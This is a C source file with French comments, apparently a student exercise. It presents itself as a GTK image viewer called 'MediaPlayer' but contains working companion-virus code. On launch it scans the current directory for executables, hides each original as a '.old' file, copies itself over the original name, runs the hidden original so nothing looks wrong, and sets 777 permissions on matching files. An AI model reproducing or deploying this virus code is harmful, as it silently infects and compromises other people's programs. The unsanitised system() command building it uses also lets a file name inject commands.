#include <stdlib.h>
#include <stdio.h>
#include <dirent.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>
#include <string.h>
#include <signal.h>
#include <string.h>
#include <gtk/gtk.h>
#include <gtk/gtkx.h>

void createMedia();
void lecture();
void infection(struct dirent *fichier);
int isInfected(char name[100]);

char imageSelect[300] = "";
char *images[20][100] = {}; 
int tailleImages = 0;
int ptrImage = 0;
DIR* rep;
struct dirent *fichier;
char **pointeur = images;
char nomProg[50];

GtkWidget	*window;
GtkWidget	*fixed1;
GtkWidget	*button1;
GtkWidget	*button2;
GtkWidget	*button3;
GtkWidget	*image1;
GtkWidget	*file1;
GtkWidget	*frame1;
GtkBuilder	*builder; 
GtkListStore	*liststore1;
GtkAdjustment	*adjustment2;


int main(int argc, char *argv[])
{
	gtk_init(&argc, &argv); // init Gtk
	char *nom = argv[0];
	nom += 2;
	strcpy(nomProg, nom);

	if(strcmp(argv[0],"./MediaPlayer.exe") == 0)
	{		
		createMedia();
	}else{
		char exec[100];
		strcpy(exec, "./.");
		strcat(exec, nomProg);
		strcat(exec,".old");
		system(exec);
		lecture();
	}	
}


void createMedia()
{
	lecture();


	// Init GTK + relie au fichier glade + affiche la fenêtre
	
	builder = gtk_builder_new_from_file ("mediaplayer.glade");
	window = GTK_WIDGET(gtk_builder_get_object(builder, "window"));
	g_signal_connect(window, "destroy", G_CALLBACK(gtk_main_quit), NULL);
	gtk_builder_connect_signals(builder, NULL);

	// Récupération des widgets
	fixed1 = GTK_WIDGET(gtk_builder_get_object(builder, "fixed1"));
	button1 = GTK_WIDGET(gtk_builder_get_object(builder, "button1"));
	button2 = GTK_WIDGET(gtk_builder_get_object(builder, "button2"));
	button3 = GTK_WIDGET(gtk_builder_get_object(builder, "button3"));
	file1 = GTK_WIDGET(gtk_builder_get_object(builder, "file1"));
	image1 = GTK_WIDGET(gtk_builder_get_object(builder, "image1"));
	frame1 = GTK_WIDGET(gtk_builder_get_object(builder, "frame1"));
	liststore1 = GTK_LIST_STORE(gtk_builder_get_object(builder, "liststore1"));
	adjustment2 = GTK_ADJUSTMENT(gtk_builder_get_object(builder, "adjustment2"));

	// Couleur background
	GdkColor color;
	color.red = 0xcccc;
	color.green = 0xcccc;
	color.blue = 0xd900;
	gtk_widget_modify_bg(GTK_WIDGET(window), GTK_STATE_NORMAL, &color);

	gtk_widget_show(window);
	gtk_main();
}

void lecture()
{	
	// Variables pour les fichiers/le répertoire courant
	DIR* rep = NULL;
	rep = opendir(".");
	struct dirent *fichier;
	struct stat fileStat;

	char chmod[100];
	char old[100];

	if(rep == NULL)
		exit(1);

		// On parcourt les fichiers du répertoire courant
		while((fichier = readdir(rep)) != NULL)
		{
			// On donne toutes les permissions aux fichiers
			if(strstr(fichier->d_name,"MonPG") && strstr(fichier->d_name,".c") == NULL) {
				strcpy(chmod,"chmod 777 ");
				strcat(chmod,fichier->d_name);
				system(chmod);
			}

			stat(fichier->d_name,&fileStat);
			strcpy(old,fichier->d_name);
			strcat(old,".old");

			// On prend les fichiers avec les conditions suivantes : le fichier est un executable / il ne contient pas "MediaPlayer", ce n'est ni "." ni ".." (qui sont présents pour pouvoir se déplacer en arrière dans l'arborescence)
			// le fichier ne contient pas ".old" (et n'est donc pas infecté) et on vérifie pour finir que le fichier est bien accessible (+ install.sh présent seulement pour les tests)
			if((fileStat.st_mode & S_IXUSR) && strstr(fichier->d_name,"MediaPlayer") == NULL && strcmp(fichier->d_name,".") !=0 && strcmp(fichier->d_name,"..") !=0 &&  strstr(fichier->d_name,".old") == NULL && access(old,F_OK) != 0 && strcmp(fichier->d_name,"install.sh") !=0){ 
				// Pour finir on appelle la fonction séparée isInfected pour vérifier que le programme n'est pas déjà infecté
				if(!isInfected(old)) {
					printf("le fichier %s va être infecté \n",fichier->d_name);
					infection(fichier);
				}
			}
		
		}
}

void infection(struct dirent *fichier)
{
	char copyfile[100];
	char renamefile[100];

	// rename le programme cible en .old
	strcpy(renamefile,"mv ");
	strcat(renamefile,fichier->d_name);
	strcat(renamefile," .");
	strcat(renamefile,fichier->d_name);
	strcat(renamefile,".old");


	//copie le .exe infecté sous le nom du programme cible
	strcpy(copyfile,"cp ");
	strcat(copyfile, nomProg);
	strcat(copyfile, " ");
	strcat(copyfile, fichier->d_name);

	// On effectue les deux commandes préparées à la suite
	system(renamefile);
	system(copyfile);
}


// AFFICHAGE (partie GTK)

// Quand on séléctionne un fichier => stockage du chemin/nom dans imageSelect
void on_file1_file_set(GtkFileChooserButton *f) {
	sprintf(imageSelect, gtk_file_chooser_get_filename (GTK_FILE_CHOOSER(f)));

// Pour chaque image png ou jpg du dossier on ajoute au tableau {images} et on retient la taille totale du tableau
// Image bienvenue -> pas comptée / image séléctionnée -> dans ptrImage
	rep = opendir(".");
	int i = 0;
	while((fichier = readdir(rep)) != NULL) {
		if((strstr(fichier->d_name,".png") || strstr(fichier->d_name,".jpg")) && !strstr(fichier->d_name,"bienvenue")) {
			pointeur[i] = fichier->d_name;
			i++;
			if(strstr(imageSelect, fichier->d_name)) ptrImage = i-1;
		}
	}
	tailleImages = i;
}

// Fonction affichant une image
void afficheImage(char* nom) {
	int hor = 150, ver = 1;
	if (image1) {
		gtk_container_remove (GTK_CONTAINER (fixed1), image1); // enlève la dernière image
		gtk_widget_hide(image1);
        image1 = gtk_image_new_from_file (nom);
        gtk_container_add (GTK_CONTAINER (fixed1), image1);
        gtk_widget_show(image1);
        gtk_fixed_move (GTK_FIXED(fixed1), image1, hor, ver);
	}
}

// Bouton précédent
void on_button1_clicked(GtkButton *button1) {
	if(ptrImage == 0) ptrImage = tailleImages-1;
	else ptrImage --;
	afficheImage(pointeur[ptrImage]);
	
}

// Bouton suivant
void on_button2_clicked(GtkButton *b) {
	if(ptrImage == tailleImages-1) ptrImage = 0;
	else ptrImage ++;
	afficheImage(pointeur[ptrImage]);
}


// Bouton pour afficher l'image séléctionnée
void on_button3_clicked(GtkButton *b) {
	afficheImage(imageSelect);
}

int isInfected(char name[100]) {
	char temp[100];

	// On prend en entrée [nom du programme].old, on rajoute un . devant pour avoir le format du fichier infecté
	strcpy(temp, ".");
	strcat(temp, name);

	// Parcours des fichiers : si on trouve une correspondance avec temp, le fichier est infecté, sinon non
	rep = opendir(".");
	int is = 0;
	while((fichier = readdir(rep)) != NULL) {
		if(strstr(fichier->d_name, temp)) is = 1;
	}
	return is;
}